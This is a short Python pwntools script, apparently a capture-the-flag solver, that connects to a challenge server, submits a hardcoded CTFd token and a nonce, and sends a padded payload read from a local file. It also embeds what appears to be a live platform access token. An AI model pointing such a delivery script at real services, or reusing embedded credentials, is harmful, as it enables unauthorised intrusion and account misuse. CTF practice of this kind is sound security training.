from pwn import *

HOST, PORT = "chal.thjcc.org", 9000
PAYLOAD = open("payload.txt", encoding="utf-8").read().rstrip("\n").ljust(6767)

io = remote(HOST, PORT, timeout=15)
io.sendlineafter(b"token: ", b"ctfd_d075316850c7fdb4a81a6f609916145d92b0a6af1037ad5d2b21d8d245bd48c8")
io.sendlineafter(b"(please enter number): ", b"3")

nonce = io.recvuntil(b" to confirm").rsplit(b"Please enter ", 1)[1].split(b" to")[0].strip()
io.sendlineafter(b"nonce: ", nonce)

io.sendlineafter(b">> ", PAYLOAD.encode())
print(io.recvall(timeout=15).decode(errors="replace"))
io.close()
